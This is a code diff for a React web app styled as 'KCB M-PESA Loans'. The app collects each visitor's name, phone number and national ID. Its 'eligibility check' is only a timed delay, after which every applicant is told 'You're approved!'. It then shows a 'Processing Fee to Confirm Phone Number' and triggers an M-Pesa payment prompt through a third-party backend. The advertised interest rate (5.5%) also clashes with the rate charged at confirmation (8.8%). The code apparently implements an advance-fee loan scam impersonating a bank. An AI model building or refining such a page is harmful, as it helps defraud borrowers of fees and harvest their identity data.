@@ -22,17 +22,67 @@ import {
 const MPESA_BASE = "https://payhero-backend-m78g.onrender.com";
 
 /* ── Loan packages (amount, fee, repayment = amount + fee + interest) ── */
-const LOANS = [
-  { amount: 10900,  fee: 210,  repayment: 10780 },
-  { amount: 15200, fee: 260,  repayment: 12320 },
-  { amount: 20800, fee: 310,  repayment: 18480 },
-  { amount: 25200, fee: 360,  repayment: 23320 },
-  { amount: 30600, fee: 410,  repayment: 28160 },
-  { amount: 40000, fee: 560,  repayment: 33000 },
-  { amount: 50400, fee: 680,  repayment: 38940 },
-  { amount: 60800, fee: 1080,  repayment: 43780 },
-  { amount: 70200, fee: 1900,  repayment: 48620 },
-  { amount: 80600, fee: 2550, repayment: 53460 },
+const LOAN_GROUPS = [
+  {
+    title: "Personal Loan Loans",
+    items: [
+      { amount: 4000, fee: 199 },
+      { amount: 8000, fee: 213 },
+      { amount: 11000, fee: 293 },
+      { amount: 15000, fee: 449 },
+      { amount: 23000, fee: 612 },
+      { amount: 30000, fee: 799 },
+      { amount: 45000, fee: 1197 },
+    ],
+  },
+  {
+    title: "Business Loan Loans",
+    items: [
+      { amount: 13000, fee: 346 },
+      { amount: 25000, fee: 649 },
+      { amount: 38000, fee: 1011 },
+      { amount: 50000, fee: 1299 },
+      { amount: 75000, fee: 1799 },
+      { amount: 100000, fee: 2499 },
+      { amount: 150000, fee: 3990 },
+    ],
+  },
+  {
+    title: "Education Loan Loans",
+    items: [
+      { amount: 5000, fee: 199 },
+      { amount: 10000, fee: 349 },
+      { amount: 15000, fee: 449 },
+      { amount: 20000, fee: 549 },
+      { amount: 30000, fee: 799 },
+      { amount: 40000, fee: 999 },
+      { amount: 60000, fee: 1596 },
+    ],
+  },
+  {
+    title: "Emergency Loan Loans",
+    items: [
+      { amount: 3000, fee: 80 },
+      { amount: 5000, fee: 199 },
+      { amount: 8000, fee: 213 },
+      { amount: 10000, fee: 349 },
+      { amount: 15000, fee: 449 },
+      { amount: 20000, fee: 549 },
+      { amount: 30000, fee: 799 },
+    ],
+  },
+  {
+    title: "Home Improvement Loans",
+    items: [
+      { amount: 25000, fee: 649 },
+      { amount: 50000, fee: 1299 },
+      { amount: 75000, fee: 1799 },
+      { amount: 100000, fee: 2499 },
+      { amount: 150000, fee: 3990 },
+      { amount: 200000, fee: 5320 },
+      { amount: 300000, fee: 7980 },
+    ],
+  },
 ];
 
 
@@ -97,7 +147,123 @@ input::placeholder{color:#b0b8b0}
 ::-webkit-scrollbar{width:3px}::-webkit-scrollbar-thumb{background:#c8dfc8;border-radius:2px}
 
 /* ── APP SHELL ── */
-.app{max-width:480px;margin:0 auto;min-height:100vh;background:#f0f7f0;position:relative;overflow-x:hidden}
+.app{max-width:900px;margin:0 auto;min-height:100%;background:#f0f7f0;position:relative;overflow-x:hidden}
+
+
+
+
+.hero-wrap{
+  display:flex;
+  gap:20px;
+  padding:24px 20px;
+  align-items:center;
+  justify-content:space-between;
+}
+
+.hero-left{
+  flex:1;
+}
+
+.hero-title{
+  font-size:26px;
+  font-weight:800;
+  color:#1f3b73;
+  line-height:1.2;
+}
+
+.hero-title span{
+  color:#dc2626;
+}
+
+.hero-desc{
+  font-size:13px;
+  color:#6b7280;
+  margin:10px 0 14px;
+}
+
+.hero-steps{
+  display:flex;
+  gap:10px;
+  font-size:12px;
+  color:#374151;
+  margin-bottom:14px;
+}
+
+.hero-steps div{
+  display:flex;
+  align-items:center;
+  gap:6px;
+}
+
+.hero-circle{
+  width:20px;
+  height:20px;
+  border-radius:50%;
+  background:#1f3b73;
+  color:#fff;
+  font-size:11px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+
+.hero-btn{
+  background:#dc2626;
+  color:#fff;
+  border:none;
+  padding:12px 16px;
+  border-radius:8px;
+  font-weight:700;
+  cursor:pointer;
+}
+
+.hero-right{
+  flex:1;
+  max-width:360px;
+}
+
+.hero-img{
+  width:100%;
+  height:auto;
+  border-radius:16px;
+}
+
+.hero-stats{
+  position:absolute;
+  bottom:10px;
+  left:10px;
+  right:10px;
+  background:#fff;
+  border-radius:12px;
+  display:flex;
+  justify-content:space-between;
+  padding:10px;
+  font-size:12px;
+  box-shadow:0 4px 10px rgba(0,0,0,0.1);
+}
+
+.hero-stat strong{
+  display:block;
+  font-size:14px;
+}
+
+
+
+
+
+
+
+
+
+
+:root {
+  --primary-blue: #1e3a8a;
+  --light-blue: #eaf1fb;
+  --danger-red: #dc2626;
+  --accent-orange: #f59e0b;
+  --success-green: #22c55e;
+  --bg-main: #f8fafc;
+}
 
 /* ── TOP BAR ── */
 .topbar{background:linear-gradient(135deg,#1a7a3a,#2d9e52);padding:16px 20px 14px;display:flex;align-items:center;justify-content:space-between}
@@ -250,7 +416,7 @@ function Ticker({ items }) {
   }, [items.length]);
   return (
     <div className="ticker-wrap">
-      <span className="ticker-icon">📢</span>
+      <span className="ticker-icon">...</span>
       <span className="ticker-text">{items[idx]}</span>
     </div>
   );
@@ -262,283 +428,617 @@ function HeroScreen({ onStart }) {
     <div>
       <div className="topbar">
         <div className="logo-pill">
-          <span className="logo-text">KCB Loans<span className="logo-reg">®</span></span>
+          <span className="logo-text">KCB M-PESA Loans</span>
         </div>
-        <div className="topbar-tag">♦ Your Trusted Financial Partner ♦</div>
+        <div style={{fontSize:12,color:"#fff"}}>Help</div>
+      </div>
+
+      <div className="hero-wrap">
+        
+        {/* LEFT */}
+        <div className="hero-left">
+          <div className="hero-title">
+            Get Up To <span>Ksh 100,000</span>
+          </div>
+
+          <div className="hero-desc">
+            Low 5.5% interest rate for qualified borrowers
+          </div>
+
+          <div className="hero-steps">
+            <div><span className="hero-circle">1</span>Apply</div>
+            <div><span className="hero-circle">2</span>Approve</div>
+            <div><span className="hero-circle">3</span>Receive</div>
+          </div>
+
+          <button className="hero-btn" onClick={onStart}>
+            Apply Now
+          </button>
+        </div>
+
+        {/* RIGHT IMAGE */}
+        <div className="hero-right">
+          <img src="/kcb-hero.png" className="hero-img" />
+
+          <div className="hero-stats">
+            <div className="hero-stat">
+              <strong>Ksh 100K</strong>
+              Max Amount
+            </div>
+            <div className="hero-stat">
+              <strong style={{color:"#dc2626"}}>5.5%</strong>
+              Interest
+            </div>
+            <div className="hero-stat">
+              <strong style={{color:"#16a34a"}}>3 Steps</strong>
+              Process
+            </div>
+          </div>
+        </div>
+
       </div>
 
       <Ticker items={RECENT} />
 
-      <div className="hero-card">
-        <div className="hero-avail">AVAILABLE LOAN AMOUNT</div>
-        <div className="hero-amount">
-          Ksh. 1,000 <span className="hero-dash">–</span><br />100,000
-        </div>
-        <div className="hero-sub">Affordable financing for Kenyan youth &amp; entrepreneurs</div>
-        <div className="features-grid">
-          <div className="feat-box">
-        <div className="feat-icon"><FaBolt /></div>      
-      <div className="feat-label">Fast Approval</div>
-          </div>
-          <div className="feat-box">
-<div className="modal-icon"><FaMobileAlt /></div>          
-  <div className="feat-label">Paperless Process</div>
-          </div>
-          <div className="feat-box">
-            <div className="feat-icon"><FaShieldAlt/></div>
-            <div className="feat-label">Secure &amp; Safe</div>
-          </div>
-          <div className="feat-box">
-            <div className="feat-icon"><FaMoneyBillWave/></div>
-            <div className="feat-label">Flexible Terms</div>
-          </div>
-        </div>
-      </div>
-
-      <button className="btn-primary" onClick={onStart} style={{display:"flex"}}>
+      <button className="btn-primary" onClick={onStart}>
         Start Application →
       </button>
 
- 
-
-<div className="security-strip">
-  {SECURITY.map((item) => {
-  const Icon = item.icon;
-  return (
-    <div key={item.label} className="sec-pill">
-      <Icon />
-      <span>{item.label}</span>
-    </div>
-  );
-})}
-</div>
+      <div className="security-strip">
+        {SECURITY.map((item) => {
+          const Icon = item.icon;
+          return (
+            <div key={item.label} className="sec-pill">
+              <Icon />
+              <span>{item.label}</span>
+            </div>
+          );
+        })}
+      </div>
     </div>
   );
 }
+
+
+
+
+
+
+
+
 
 /* ── SCREEN 2: ELIGIBILITY FORM ── */
 function EligibilityScreen({ onNext }) {
-  const [f, setF] = useState({ name:"", phone:"", id:"", loanType:"" });
-const [errs, setErrs] = useState<Record<string, string>>({});  const [loading, setLoading] = useState(false);
-  const set = (k, v) => setF(p => ({ ...p, [k]: v }));
+  const [form, setForm] = useState({
+    name: "",
+    phone: "",
+    id: "",
+    loanType: ""
+  });
+const [errs, setErrs] = useState({
+  name: "",
+  phone: "",
+  id: "",
+  loanType: ""
+});
+  const [loading, setLoading] = useState(false);
+
+  const update = (key, value) => {
+    setForm(prev => ({ ...prev, [key]: value }));
+
+    // clear error instantly when user edits
+    setErrs(prev => ({ ...prev, [key]: "" }));
+  };
 
   const validate = () => {
- const e : {
+    const e = {
+  name: "",
+  phone: "",
+  id: "",
+  loanType: ""
+};
+    if (!form.name.trim()) {
+      e.name = "Enter your full name";
+    }
 
+    if (!isValidPhone(form.phone)) {
+      e.phone = "Enter valid Safaricom number (07, 01, or 254...)";
+    }
 
+    if (!/^\d{7,9}$/.test(form.id)) {
+      e.id = "Enter valid ID (7–9 digits)";
+    }
 
-  name?: string;
-
-
-
-  phone?: string;
-
-
-
-  id?: string;
-
-
-
-  loanType?: string;
-
-} = {};
-
-    if (!f.name.trim() || f.name.trim().length < 3) e.name = "Enter your full name";
-
-    if (!isValidPhone(f.phone)) e.phone = "Enter valid Safaricom/Airtel number";
-
-    if (!f.id.trim().match(/^\d{7,8}$/)) e.id = "Enter valid 7–8 digit ID number";
-
-    if (!f.loanType) e.loanType = "Select a loan type";
+    if (!form.loanType) {
+      e.loanType = "Select loan type";
+    }
 
     return e;
-
   };
 
   const submit = async () => {
-    const e: any = validate();
-    if (Object.keys(e).length) { setErrs(e); return; }
+    const e = validate();
+
+    if (Object.keys(e).length) {
+      setErrs(e);
+      return;
+    }
+
     setLoading(true);
-    await new Promise(r => setTimeout(r, 1400)); // simulated eligibility check
+
+    await new Promise(r => setTimeout(r, 1000));
+
     setLoading(false);
-    onNext(f);
-  };
 
-  const inp = (k) => ({
-    className: `finp${errs[k] ? " err" : ""}`,
-    value: f[k],
-    onChange: e => { set(k, e.target.value); if (errs[k]) setErrs(p => ({ ...p, [k]: "" })); },
-  });
-
-  return (
-    <>
-      <div className="topbar">
-        <div className="logo-pill">
-          <span className="logo-text">KCB Loans<span className="logo-reg">®</span></span>
-        </div>
-      </div>
-
-      <div style={{ height: 16 }} />
-
-      <div className="form-wrap">
-        <div className="form-title">Check Your Loan Eligibility</div>
-        <div className="form-sub">Find out how much you qualify for</div>
-        <div className="form-range">Ksh. 1,000 – 100,000</div>
-
-        <input {...inp("name")} type="text" placeholder="Full Name" autoComplete="name" />
-        {errs.name && <div className="ferr">{errs.name}</div>}
-
-        <input
-          className={`finp${errs.phone ? " err" : ""}`}
-          type="tel"
-          inputMode="numeric"
-          placeholder="Phone Number"
-          value={f.phone}
-          onChange={e => { set("phone", e.target.value.replace(/[^\d]/g, "").slice(0, 12)); if (errs.phone) setErrs(p => ({ ...p, phone: "" })); }}
-        />
-        {errs.phone && <div className="ferr">{errs.phone}</div>}
-
-        <input
-          className={`finp${errs.id ? " err" : ""}`}
-          type="text"
-          inputMode="numeric"
-          placeholder="ID Number"
-          value={f.id}
-          onChange={e => { set("id", e.target.value.replace(/\D/g, "").slice(0, 8)); if (errs.id) setErrs(p => ({ ...p, id: "" })); }}
-        />
-        {errs.id && <div className="ferr">{errs.id}</div>}
-
-        <select
-          className={`fsel${errs.loanType ? " err" : ""}`}
-          value={f.loanType}
-          onChange={e => { set("loanType", e.target.value); if (errs.loanType) setErrs(p => ({ ...p, loanType: "" })); }}
-        >
-          <option value="">Select Loan Type</option>
-          {LOAN_TYPES.map(l => <option key={l} value={l}>{l}</option>)}
-        </select>
-        {errs.loanType && <div className="ferr">{errs.loanType}</div>}
-
-        <div className="security-strip">
-  {SECURITY.map((item) => {
-  const Icon = item.icon;
-  return (
-    <div key={item.label} className="sec-pill">
-      <Icon />
-      <span>{item.label}</span>
-    </div>
-  );
-})}
-</div>
-
-        <button
-          className="btn-primary"
-          style={{ width:"100%", margin:0, display:"flex" }}
-          onClick={submit}
-          disabled={loading}
-        >
-          {loading ? <><span className="spin" /> &nbsp;Checking Eligibility…</> : "Check Eligibility →"}
-        </button>
-        <div className="form-bottom-note" style={{ marginTop: 14 }}>
-          No paperwork required. No guarantors needed.
-        </div>
-      </div>
-
-      <div style={{ height: 24 }} />
-
-      <div className="security-strip">
-  {SECURITY.map((item) => {
-  const Icon = item.icon;
-  return (
-    <div key={item.label} className="sec-pill">
-      <Icon />
-      <span>{item.label}</span>
-    </div>
-  );
-})}
-</div>
-    </>
-  );
-}
-
-/* ── SCREEN 3: LOAN GRID ── */
-function LoanGridScreen({ userData, onSelect }) {
-  const [selected, setSelected] = useState(null);
-
-  const proceed = () => {
-    if (!selected) return;
-    onSelect(selected);
+    onNext({
+      ...form,
+      phone: normalisePhone(form.phone) // ✅ ALWAYS normalized
+    });
   };
 
   return (
     <>
-      <div className="topbar">
-        <div className="logo-pill">
-          <span className="logo-text">KCB Loans<span className="logo-reg">®</span></span>
+      {/* TOP BAR */}
+      <div style={topBar}>
+        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+          ←
+          <strong>KCB M-PESA Loans</strong>
         </div>
+        <span style={{ fontSize: 12 }}>Help</span>
       </div>
 
-      <Ticker items={RECENT} />
+      {/* FORM */}
+      <div style={container}>
+        <div style={card}>
 
-      <div className="screen-title">Select Your Loan Amount</div>
+          <h2 style={title}>M-PESA INFORMATION</h2>
+          <p style={subtitle}>Fill in your details to check eligibility</p>
 
-      <div className="loan-grid">
-        {LOANS.map(loan => (
-          <div
-            key={loan.amount}
-            className={`loan-card${selected?.amount === loan.amount ? " selected" : ""}`}
-            onClick={() => setSelected(loan)}
+          {/* NAME */}
+          <label style={label}>Full Name</label>
+          <input
+            type="text"
+            placeholder="Enter your full name"
+            value={form.name}
+            onChange={e => update("name", e.target.value)}
+            style={inputStyle(errs.name)}
+          />
+          {errs.name && <small style={errStyle}>{errs.name}</small>}
+
+          {/* PHONE */}
+          <label style={label}>Phone Number</label>
+          <input
+            type="tel"
+            placeholder="0712345678"
+            value={form.phone}
+            onChange={e =>
+              update("phone", e.target.value.replace(/\D/g, ""))
+            }
+            style={inputStyle(errs.phone)}
+          />
+          <small style={hint}>Safaricom line required</small>
+          {errs.phone && <small style={errStyle}>{errs.phone}</small>}
+
+          {/* ID */}
+          <label style={label}>National ID</label>
+          <input
+            type="text"
+            placeholder="7 to 9 digits"
+            value={form.id}
+            onChange={e =>
+              update("id", e.target.value.replace(/\D/g, ""))
+            }
+            style={inputStyle(errs.id)}
+          />
+          {errs.id && <small style={errStyle}>{errs.id}</small>}
+
+          {/* SELECT */}
+          <label style={label}>Loan Type</label>
+          <select
+            value={form.loanType}
+            onChange={e => update("loanType", e.target.value)}
+            style={inputStyle(errs.loanType)}
           >
-            <div className="loan-amount">Ksh {fmt(loan.amount)}</div>
-            <div className="loan-fee">Fee: Ksh {fmt(loan.fee)}</div>
-          </div>
-        ))}
+            <option value="">Select loan type</option>
+            {LOAN_TYPES.map(l => (
+              <option key={l}>{l}</option>
+            ))}
+          </select>
+          {errs.loanType && <small style={errStyle}>{errs.loanType}</small>}
+
+          {/* BUTTON */}
+          <button
+            onClick={submit}
+            disabled={loading}
+            style={btn}
+          >
+            {loading ? "Checking..." : "Check Eligibility"}
+          </button>
+
+        </div>
       </div>
 
-      <button
-        className="btn-primary-fixed"
-        onClick={proceed}
-        disabled={!selected}
-      >
-        Get Loan Now →
-      </button>
-
-      <div style={{ height: 80 }} />
+      {/* FOOTER */}
+      <div style={footer}>
+        <span>Privacy</span>
+        <span>Terms</span>
+        <span>Contact</span>
+      </div>
     </>
   );
 }
+
+
+/* ── STYLES ── */
+const topBar = {
+  display: "flex",
+  justifyContent: "space-between",
+  padding: "14px 16px",
+  background: "#fff",
+  borderBottom: "1px solid #eee"
+};
+
+const container = {
+  display: "flex",
+  justifyContent: "center",
+  padding: "30px 16px"
+};
+
+const card = {
+  width: "100%",
+  maxWidth: 520,
+  background: "#fff",
+  borderRadius: 16,
+  padding: "28px 22px",
+  boxShadow: "0 10px 30px rgba(0,0,0,0.08)"
+};
+
+const title = {
+  textAlign: "center" as const,
+  fontWeight: 800,
+  color: "#1f3b73",
+  marginBottom: 6
+};
+const subtitle = {
+  textAlign: "center" as const,
+  fontSize: 13,
+  color: "#6b7280",
+  marginBottom: 20
+};
+
+const label = {
+  fontSize: 13,
+  fontWeight: 600
+};
+
+const hint = {
+  fontSize: 11,
+  color: "#9ca3af"
+};
+
+const btn = {
+  width: "100%",
+  background: "#dc2626",
+  color: "#fff",
+  padding: "14px",
+  border: "none",
+  borderRadius: 10,
+  fontWeight: 700,
+  cursor: "pointer"
+};
+
+const inputStyle = (err) => ({
+  width: "100%",
+  padding: "12px",
+  marginTop: 6,
+  marginBottom: 12,
+  borderRadius: 8,
+  border: err ? "1.5px solid red" : "1.5px solid #e5e7eb",
+  outline: "none",
+  fontSize: 14
+});
+
+const errStyle = {
+  color: "red",
+  fontSize: 11,
+  marginTop: -8,
+  display: "block",
+  marginBottom: 8
+};
+const footer = {
+  background: "#1f3b73",
+  color: "#fff",
+  padding: "14px",
+  fontSize: 12,
+  display: "flex",
+  justifyContent: "space-between"
+};
+
+
+function LoanGridScreen({ userData, onSelect }) {
+  return (
+    <>
+      <div className="topbar">
+        <div className="logo-pill">
+          <span className="logo-text">KCB M-PESA Loans</span>
+        </div>
+      </div>
+
+
+      <div style={{ padding: "24px 16px 10px" }}>
+  <div style={{ textAlign: "center", marginBottom: 10 }}>
+    <div style={{
+      width: 60,
+      height: 60,
+      borderRadius: "50%",
+      background: "#e6f4ea",
+      display: "flex",
+      alignItems: "center",
+      justifyContent: "center",
+      margin: "0 auto 10px",
+      fontSize: 26
+    }}>
+      ✅
+    </div>
+
+    <h2 style={{
+      fontSize: 22,
+      fontWeight: 700,
+      color: "#1f3b73",
+      marginBottom: 4
+    }}>
+      You're approved!
+    </h2>
+
+    <p style={{
+      fontSize: 14,
+      color: "#6b7280"
+    }}>
+      Great news, <b>{userData.name}</b>! Pick the loan amount that works best for you.
+    </p>
+
+    <p style={{
+      fontSize: 12,
+      color: "#9ca3af",
+      marginTop: 6
+    }}>
+      5 loan types available
+    </p>
+  </div>
+</div>
+
+
+
+
+
+      
+
+      {LOAN_GROUPS.map((group, idx) => (
+        <div key={idx} style={{ padding: "10px 16px" }}>
+
+<div style={{
+  display: "flex",
+  alignItems: "center",
+  gap: 6,
+  marginBottom: 10
+}}>
+  <div style={{
+    width: 3,
+    height: 16,
+    background: "#1f3b73",
+    borderRadius: 2
+  }} />
+
+  <h4 style={{
+    fontSize: 16,
+    fontWeight: 600,
+    color: "#1f3b73"
+  }}>
+    {group.title}
+  </h4>
+
+  <span style={{
+    fontSize: 12,
+    color: "#9ca3af"
+  }}>
+    {group.title.includes("Personal") && "Flexible loans for personal needs"}
+    {group.title.includes("Business") && "Grow your business"}
+    {group.title.includes("Education") && "Invest in your future"}
+    {group.title.includes("Emergency") && "Quick emergency funds"}
+    {group.title.includes("Home") && "Upgrade your home"}
+  </span>
+</div>
+
+
+
+         
+          <div style={{
+            display: "grid",
+            gridTemplateColumns: "1fr 1fr",
+            gap: 10
+          }}>
+            {group.items.map((loan) => (
+              <div
+  key={loan.amount}
+  style={{
+    background: "#fff",
+    padding: 16,
+    borderRadius: 14,
+    border: "1px solid #e5e7eb",
+    boxShadow: "0 2px 8px rgba(0,0,0,0.04)",
+    textAlign: "center"
+  }}
+>
+  <div style={{
+    fontWeight: 700,
+    fontSize: 16,
+    color: "#1f3b73"
+  }}>
+    KSh {fmt(loan.amount)}
+  </div>
+
+  <div style={{
+    fontSize: 12,
+    color: "#6b7280",
+    marginTop: 4
+  }}>
+    Repay over 6 months
+  </div>
+
+  <div style={{
+    fontSize: 12,
+    color: "#f97316",
+    marginTop: 4,
+    fontWeight: 500
+  }}>
+    Fee: KSh {fmt(loan.fee)}
+  </div>
+
+  <button
+    onClick={() => onSelect(loan)}
+    style={{
+      marginTop: 12,
+      width: "100%",
+      padding: "10px 0",
+      borderRadius: 10,
+      border: "none",
+      background: "#f3f4f6",
+      fontWeight: 700,
+      fontSize: 13,
+      color: "#374151",
+      cursor: "pointer"
+    }}
+  >
+    SELECT
+  </button>
+</div>
+            ))}
+          </div>
+        </div>
+      ))}
+    </>
+  );
+}
+
+
+
 
 /* ── MODAL: CONFIRM LOAN APPLICATION ── */
-function ConfirmModal({ loan, userData, onProceed, onCancel }) {
+function ConfirmScreen({ loan, userData, onApply, onBack }) {
+  const interest = Math.round(loan.amount * 0.088);
+  const total = loan.amount + loan.fee + interest;
+
+  const normPhone = normalisePhone(userData.phone) || userData.phone;
+
   return (
-    <div className="modal-bg" onClick={onCancel}>
-      <div className="modal-box" onClick={e => e.stopPropagation()}>
-        <div style={{ textAlign: "center", marginBottom: 0 }}>
-          <div className="modal-icon doc">📄</div>
+    <div style={{ padding: 16 }}>
+      
+      <div style={{ marginBottom: 10, cursor: "pointer" }} onClick={onBack}>
+        ← Back to offers
+      </div>
+
+      <div style={{
+        background: "#1f3b73",
+        color: "#fff",
+        padding: 16,
+        borderRadius: 12,
+        marginBottom: 16,
+        fontWeight: 700,
+        fontSize: 18
+      }}>
+        Confirm Your Loan
+      </div>
+
+      <div style={{
+        background: "#fff",
+        padding: 16,
+        borderRadius: 12
+      }}>
+        <p>Hi {userData.name}, please review the details below before applying.</p>
+
+        <div style={{
+          background: "#e2e8f0",
+          padding: 16,
+          borderRadius: 10,
+          margin: "12px 0",
+          display: "flex",
+          justifyContent: "space-between"
+        }}>
+          <div>
+            <div style={{ fontSize: 12 }}>LOAN AMOUNT</div>
+            <div style={{ fontWeight: 800, fontSize: 20 }}>
+              KSh {fmt(loan.amount)}
+            </div>
+          </div>
+
+          <div style={{ textAlign: "right" }}>
+            <div style={{ fontSize: 12 }}>Repayment Period</div>
+            <div style={{ fontWeight: 700 }}>6 months</div>
+          </div>
         </div>
-        <div className="modal-title">Confirm Loan Application</div>
 
-        <div className="modal-details">
-          <div className="modal-row">
-            <span className="modal-row-key">Loan Amount:</span>
-            <span className="modal-row-val green">Ksh {fmt(loan.amount)}</span>
-          </div>
-          <div className="modal-row">
-            <span className="modal-row-key">Processing Fee:</span>
-            <span className="modal-row-val">Ksh {fmt(loan.fee)}</span>
-          </div>
-          <div className="modal-row">
-            <span className="modal-row-key">Total Repayment:</span>
-            <span className="modal-row-val">Ksh {fmt(loan.repayment)}</span>
-          </div>
+        <div style={{ marginTop: 10, marginBottom: 10, fontWeight: 700 }}>
+          FEE BREAKDOWN
         </div>
 
-        <div className="modal-phone-line">An M-Pesa prompt will be sent to complete your application</div>
-        <div className="modal-phone-num">Phone: {userData.phone}</div>
+        <div style={{ display: "flex", justifyContent: "space-between" }}>
+          <div>
+            <div>Processing Fee to Confirm Phone Number</div>
+            <div style={{ fontSize: 12, color: "#666" }}>One-time</div>
+          </div>
+          <div>KSh {fmt(loan.fee)}</div>
+        </div>
 
-        <button className="btn-proceed" onClick={onProceed}>
-          Pay Application Fee,Proceed
+        <div style={{ display: "flex", justifyContent: "space-between", marginTop: 8 }}>
+          <div>
+            <div>Interest</div>
+            <div style={{ fontSize: 12, color: "#666" }}>8.8%</div>
+          </div>
+          <div>KSh {fmt(interest)}</div>
+        </div>
+
+        <div style={{ display: "flex", justifyContent: "space-between", marginTop: 8 }}>
+          <span>Repayment period</span>
+          <span>6 months</span>
+        </div>
+
+        <hr style={{ margin: "14px 0" }} />
+
+        <div style={{
+          display: "flex",
+          justifyContent: "space-between",
+          fontWeight: 800,
+          color: "red"
+        }}>
+          <span>Total repayment</span>
+          <span>KSh {fmt(total)}</span>
+        </div>
+
+        <div style={{
+          marginTop: 14,
+          background: "#f1f5f9",
+          padding: 12,
+          borderRadius: 10,
+          textAlign: "center"
+        }}>
+          Funds will be sent to <b>+{normPhone}</b>
+        </div>
+
+        <button
+          onClick={onApply}
+          style={{
+            marginTop: 20,
+            width: "100%",
+            padding: 16,
+            background: "#e11d48",
+            color: "#fff",
+            border: "none",
+            borderRadius: 10,
+            fontWeight: 700
+          }}
+        >
+          APPLY NOW
         </button>
-        <button className="btn-cancel" onClick={onCancel}>Cancel</button>
       </div>
     </div>
   );
@@ -864,10 +1364,10 @@ export default function KCBLoans() {
     setScreen("grid");
   };
 
-  const handleLoanSelect = (loan) => {
-    setSelectedLoan(loan);
-    setShowConfirm(true);
-  };
+ const handleLoanSelect = (loan) => {
+  setSelectedLoan(loan);
+  setScreen("confirm");
+};
 
   const handleProceed = () => {
     setShowConfirm(false);
@@ -892,28 +1392,43 @@ export default function KCBLoans() {
       <style>{CSS}</style>
       <div className="app">
 
-        {screen === "hero"    && <HeroScreen onStart={() => setScreen("form")} />}
-        {screen === "form"    && <EligibilityScreen onNext={handleFormNext} />}
-        {screen === "grid"    && <LoanGridScreen userData={userData} onSelect={handleLoanSelect} />}
-        {screen === "success" && <SuccessScreen loan={selectedLoan} userData={userData} onDone={handleReset} />}
+       {screen === "hero" && <HeroScreen onStart={() => setScreen("form")} />}
 
-        {showConfirm && selectedLoan && (
-          <ConfirmModal
-            loan={selectedLoan}
-            userData={userData}
-            onProceed={handleProceed}
-            onCancel={() => setShowConfirm(false)}
-          />
-        )}
+{screen === "form" && <EligibilityScreen onNext={handleFormNext} />}
 
-        {showSTK && selectedLoan && (
-          <STKModal
-            loan={selectedLoan}
-            userData={userData}
-            onSuccess={handleSuccess}
-            onCancel={() => { setShowSTK(false); setShowConfirm(false); }}
-          />
-        )}
+{screen === "grid" && (
+  <LoanGridScreen userData={userData} onSelect={handleLoanSelect} />
+)}
+
+{screen === "confirm" && selectedLoan && (
+  <ConfirmScreen
+    loan={selectedLoan}
+    userData={userData}
+    onApply={() => setShowSTK(true)}
+    onBack={() => setScreen("grid")}
+  />
+)}
+
+{screen === "success" && (
+  <SuccessScreen
+    loan={selectedLoan}
+    userData={userData}
+    onDone={handleReset}
+  />
+)}
+
+
+
+{showSTK && (
+  <STKModal
+    loan={selectedLoan}
+    userData={userData}
+    onSuccess={handleSuccess}
+    onCancel={() => setShowSTK(false)}
+  />
+)}
+
+     
 
       </div>
     </>
